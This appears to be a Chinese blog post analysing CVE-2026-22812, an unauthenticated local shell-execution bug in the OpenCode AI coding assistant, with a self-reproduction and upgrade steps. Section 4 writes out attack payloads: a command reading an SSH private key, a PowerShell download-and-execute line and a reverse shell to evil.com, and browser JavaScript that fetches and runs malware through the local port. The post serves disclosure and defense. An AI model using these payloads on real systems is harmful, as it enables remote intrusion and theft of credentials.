---
title: "OpenCode 惊现 CVSS 10.0 严重漏洞：任意代码执行"
date: "2026-01-16 12:24:36"
updated: "2026-05-30 19:24:15"
categories: ["文章", "漏洞分析"]
tags: ["opencode", "CVE-2026-22812"]
thumbnail: "/wp-content/uploads/2026/img-e22c02817d96.png"
first_image_as_thumbnail: false
excerpt: ""
after_post: ""
comments: true
wp_id: "996"
---
<h1 class="md-end-block md-heading md-focus"><span class="md-plain md-expand">OpenCode 惊现 CVSS 10.0 严重漏洞：任意代码执行</span></h1>
<blockquote>
<p class="md-end-block md-p"><span class="md-plain">就在几天前，开源 AI 编程助手 OpenCode 曝出一个</span><span class="md-pair-s "><strong><span class="md-plain">CVSS 10.0 级别</span></strong></span><span class="md-plain">的严重漏洞。任何网站都可以在你的电脑上执行任意命令——没错，只需要你访问一个恶意网页。</span></p>
</blockquote>
<div class="md-hr md-end-block" tabindex="-1">

<hr />

</div>
<h2 class="md-end-block md-heading"><span class="md-plain">一、惊魂时刻：我是如何发现自己的电脑被"控制"的</span></h2>
<p class="md-end-block md-p"><span class="md-plain">1 月 13 日，OpenCode 开发者 thdxr 紧急披露了一个安全漏洞。Cloudflare 安全研究员发现：</span><span class="md-pair-s "><strong><span class="md-plain">OpenCode 的本地服务器没有任何身份验证，任何人都可以连接并执行命令。</span></strong></span></p>
<p class="md-end-block md-p"><span class="md-plain">我第一时间检查了自己的 OpenCode 版本——</span></p>



```bash
$ opencode --version
1.1.8
```


<p class="md-end-block md-p"><span class="md-plain">心跳漏了一拍。根据官方公告，</span><span class="md-pair-s "><strong><span class="md-plain">1.1.10 之前的版本都存在这个漏洞</span></strong></span><span class="md-plain">。</span></p>

<div class="md-hr md-end-block" tabindex="-1">

<hr />

</div>
<h2 class="md-end-block md-heading"><span class="md-plain">二、漏洞原理：为什么如此严重？</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">2.1 零身份验证的本地服务器</span></h3>
<p class="md-end-block md-p"><span class="md-plain">OpenCode 在启动时会自动启动一个 HTTP 服务器（端口 4096+），用于与 Web 界面通信。但问题在于：</span><span class="md-pair-s "><strong><span class="md-plain">这个服务器没有任何身份验证机制。</span></strong></span></p>
<p class="md-end-block md-p"><span class="md-plain">任何人只要能连接到这个端口，就可以：</span></p>

<figure class="md-table-fig table-figure">
<table class="md-table">
<thead>
<tr class="md-end-block">
<th><span class="td-span"><span class="md-plain">API 端点</span></span></th>
<th><span class="td-span"><span class="md-plain">功能</span></span></th>
<th><span class="td-span"><span class="md-plain">危险等级</span></span></th>
</tr>
</thead>
<tbody>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>GET /session</code></span></span></td>
<td><span class="td-span"><span class="md-plain">列出所有会话</span></span></td>
<td><span class="td-span"><span class="md-plain">🟡 中</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>POST /session</code></span></span></td>
<td><span class="td-span"><span class="md-plain">创建新会话</span></span></td>
<td><span class="td-span"><span class="md-plain">🟡 中</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>POST /session/:id/shell</code></span></span></td>
<td><span class="td-span"><span class="md-plain">执行任意 shell 命令</span></span></td>
<td><span class="td-span"><span class="md-plain">🔴 </span><span class="md-pair-s "><strong><span class="md-plain">严重</span></strong></span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>GET /file/content?path=xxx</code></span></span></td>
<td><span class="td-span"><span class="md-plain">读取任意文件</span></span></td>
<td><span class="td-span"><span class="md-plain">🔴 </span><span class="md-pair-s "><strong><span class="md-plain">严重</span></strong></span></span></td>
</tr>
</tbody>
</table>
</figure>
<h3 class="md-end-block md-heading"><span class="md-plain">2.2 攻击场景简单得可怕</span></h3>
<p class="md-end-block md-p"><span class="md-plain">攻击流程只需要三步：</span></p>



```
1. 扫描本地端口 → 找到 OpenCode (4096+)
2. 创建会话     → POST /session
3. 执行命令     → POST /session/:id/shell
```


<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">无需用户交互、无需密码、无需任何配置。</span></strong></span></p>

<div class="md-hr md-end-block" tabindex="-1">

<hr />

</div>
<h2 class="md-end-block md-heading"><span class="md-plain">三、实战复现：我"黑"进了自己的电脑</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">3.1 发现漏洞端口</span></h3>
<p class="md-end-block md-p"><span class="md-image md-img-loaded" data-src="./image-20260116122019261.png"><img class="alignnone size-large wp-image-997" src="/wp-content/uploads/2026/img-e22c02817d96.png" alt="" width="1024" height="530" /></span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">3.2 测试 API 访问</span></h3>
<p class="md-end-block md-p"><span class="md-plain">打开浏览器或 Postman，访问：</span></p>



```bash
GET http://localhost:36504/session
```


<p class="md-end-block md-p"><span class="md-plain">返回结果让我倒吸一口凉气——</span><span class="md-pair-s "><strong><span class="md-plain">无需任何认证，直接返回了我的所有会话信息：</span></strong></span></p>
<p class="md-end-block md-p"><span class="md-image md-img-loaded" data-src="./image-20260116121320899.png"><img class="alignnone size-large wp-image-998" src="/wp-content/uploads/2026/img-18fc0da8779f.png" alt="" width="1024" height="729" /></span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">3.3 RCE 命令执行测试</span></h3>
<p class="md-end-block md-p"><span class="md-plain">接下来是最关键的一步——执行命令：</span></p>



```bash
POST http://localhost:36504/session/ses_xxx/shell
Content-Type: application/json
​
{
  "agent": "build",
  "command": "echo RCE_TEST"
}
```


<p class="md-end-block md-p"><span class="md-plain">几秒后，命令执行成功：</span></p>
<p class="md-end-block md-p"><span class="md-image md-img-loaded" data-src="./image-20260116121807871.png"><img class="alignnone size-large wp-image-999" src="/wp-content/uploads/2026/img-25e2c26aa511.png" alt="" width="1024" height="763" /></span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">3.4 弹出计算器：漏洞的铁证</span></h3>
<p class="md-end-block md-p"><span class="md-plain">为了证明这不是开玩笑，我执行了一个更直观的命令：</span></p>



```bash
{
  "agent": "build",
  "command": "calc.exe"
}
```


<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">下一秒，Windows 计算器弹了出来。</span></strong></span></p>
<p class="md-end-block md-p"><span class="md-image md-img-loaded" data-src="./image-20260116121900579.png"><img class="alignnone size-large wp-image-1000" src="/wp-content/uploads/2026/img-39fb3dc4d176.png" alt="" width="1024" height="755" /></span></p>
<p class="md-end-block md-p"><span class="md-plain">这证明：</span><span class="md-pair-s "><strong><span class="md-plain">任何能连接到这个端口的人，都能以我的用户权限执行任意代码。</span></strong></span></p>

<div class="md-hr md-end-block" tabindex="-1">

<hr />

</div>
<h2 class="md-end-block md-heading"><span class="md-plain">四、更危险的攻击：如果黑客真的来了</span></h2>
<p class="md-end-block md-p"><span class="md-plain">弹出计算器只是无害演示。如果是真正的攻击者，他们可以：</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">4.1 窃取 SSH 私钥</span></h3>


```bash
{
  "command": "type C:\\Users\\YourName\\.ssh\\id_rsa"
}
```


<h3 class="md-end-block md-heading"><span class="md-plain">4.2 植入后门</span></h3>


```bash
{
  "command": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/backdoor.ps1')\""
}
```


<h3 class="md-end-block md-heading"><span class="md-plain">4.3 建立反弹 Shell</span></h3>


```bash
{
  "command": "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('evil.com',4444);...\""
}
```


<h3 class="md-end-block md-heading"><span class="md-plain">4.4 浏览器攻击（< v1.0.216）</span></h3>
<p class="md-end-block md-p"><span class="md-plain">在漏洞修复前，</span><span class="md-pair-s "><strong><span class="md-plain">任何恶意网站</span></strong></span><span class="md-plain">都可以用这段代码攻击你：</span></p>



```javascript
// 植入在恶意网站中的代码
fetch('http://localhost:4096/session', {
  method: 'POST',
  body: '{}'
}).then(r => r.json()).then(session => {
  fetch(`http://localhost:4096/session/${session.id}/shell`, {
    method: 'POST',
    body: JSON.stringify({
      agent: 'build',
      command: 'powershell -c "Invoke-WebRequest http://evil.com/malware.exe -OutFile temp.exe; Start-Process temp.exe"'
    })
  })
})
```


<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">你只是访问了一个网页，电脑就被控制了。</span></strong></span></p>

<div class="md-hr md-end-block" tabindex="-1">

<hr />

</div>
<h2 class="md-end-block md-heading"><span class="md-plain">五、版本对比：你受影响了吗？</span></h2>
<figure class="md-table-fig table-figure">
<table class="md-table">
<thead>
<tr class="md-end-block">
<th><span class="td-span"><span class="md-plain">版本</span></span></th>
<th><span class="td-span"><span class="md-plain">任意网站攻击</span></span></th>
<th><span class="td-span"><span class="md-plain">本地攻击</span></span></th>
<th><span class="td-span"><span class="md-plain">状态</span></span></th>
</tr>
</thead>
<tbody>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s "><strong><span class="md-plain">< 1.0.216</span></strong></span></span></td>
<td><span class="td-span"><span class="md-plain">✅ 可行</span></span></td>
<td><span class="td-span"><span class="md-plain">✅ 可行</span></span></td>
<td><span class="td-span"><span class="md-plain">🔴 极度危险</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s "><strong><span class="md-plain">1.0.216 - 1.1.9</span></strong></span></span></td>
<td><span class="td-span"><span class="md-plain">❌ 受限</span></span></td>
<td><span class="td-span"><span class="md-plain">✅ 可行</span></span></td>
<td><span class="td-span"><span class="md-plain">🟠 存在 RCE</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s "><strong><span class="md-plain">≥ 1.1.10</span></strong></span></span></td>
<td><span class="td-span"><span class="md-plain">❌ 修复</span></span></td>
<td><span class="td-span"><span class="md-plain">❌ 修复</span></span></td>
<td><span class="td-span"><span class="md-plain">🟢 安全</span></span></td>
</tr>
</tbody>
</table>
</figure>
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">我的版本是 1.1.8，属于第二档——虽然网站攻击被修复了，但本地任何进程仍可执行命令。</span></strong></span></p>

<div class="md-hr md-end-block" tabindex="-1">

<hr />

</div>
<h2 class="md-end-block md-heading"><span class="md-plain">六、立即修复：三步完成</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">步骤 1：检查版本</span></h3>


```bash
opencode --version
```


<h3 class="md-end-block md-heading"><span class="md-plain">步骤 2：立即更新</span></h3>


```bash
# 终端版
npm update -g opencode-ai@latest

# 桌面版
# 访问 https://opencode.ai/download 重新下载安装
```


<h3 class="md-end-block md-heading"><span class="md-plain">步骤 3：验证修复</span></h3>


```bash
# 确认版本 >= 1.1.10
opencode --version

# 确认端口不再监听（默认已禁用服务器）
netstat -ano | findstr "4096"
```


<div class="md-hr md-end-block" tabindex="-1">

<hr />

</div>
<h2 class="md-end-block md-heading"><span class="md-plain">参考资料</span></h2>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-meta-i-c md-link"><a href="https://github.com/anomalyco/opencode/issues/6355"><span class="md-plain">GitHub Issue #6355</span></a></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-meta-i-c md-link"><a href="https://cy.md/opencode-rce/"><span class="md-plain">详细技术分析</span></a></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-meta-i-c md-link"><a href="https://opencode.ai/download"><span class="md-plain">官方下载页面</span></a></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-meta-i-c md-link"><a href="https://byteiota.com/opencode-rce-cvss-10-vulnerability/"><span class="md-plain">ByteIota 深度报告</span></a></span></p>
</li>
</ul>
